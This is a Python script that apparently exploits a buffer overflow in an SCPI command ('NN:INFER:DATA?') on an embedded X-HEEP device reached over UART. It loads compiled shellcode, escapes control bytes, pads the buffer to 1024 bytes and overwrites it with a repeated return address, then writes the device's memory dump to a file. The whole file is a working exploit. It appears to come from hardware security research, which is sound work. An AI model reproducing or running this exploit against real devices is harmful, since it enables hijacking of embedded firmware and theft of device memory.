# ================================================================================
# Copyright 2024 Antonio Porsia

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ================================================================================

import serial
import sys
import struct
import os.path

ESCAPE = b"\x5C"

os.system("./compile.sh dump_data.s")
with open("dump_data.txt", "r") as f:
  hexdump = bytes.fromhex(f.read().strip())
  p_len = len(hexdump)
  p_list = [ESCAPE + hexdump[i:i+1] if hexdump[i] < 0x20 else hexdump[i:i+1] for i in range(p_len)]
  payload = b''.join(p_list)

# Buffer start address
addr = int(sys.argv[1], base=16)

cmd_prefix = b"NN:INFER:DATA? #41048"

print("Buffer start: 0x{:08X}".format(addr))

packed_addr = struct.pack('<I', addr)
padding = b"A" * (1024 - p_len)

# Build SCPI command string
cmd_str = cmd_prefix + payload + padding + packed_addr * 6 + b"\n"

os.system("screen -X -S uart quit")
tty = serial.Serial("/dev/ttyPS1", 115200, timeout=15)
tty.write(cmd_str)
tty.flush()

with open("xheep_uart_dump.bin", "wb") as f:
    while True:
        r = tty.read(2048)        
        f.write(r)
        if len(r) == 0:
            break